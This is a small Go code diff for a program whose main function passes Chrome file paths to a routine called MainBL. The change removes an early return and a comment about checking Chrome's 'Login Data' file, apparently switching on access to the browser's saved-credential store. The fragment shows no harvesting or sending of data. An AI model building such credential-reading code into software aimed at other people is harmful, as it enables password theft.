@@ -6,8 +6,7 @@ import (
 )
 
 func main() {
+
 	internal.MainBL(model.GetChromePaths())
-	//Check for Login Data file
-	return
 
 }
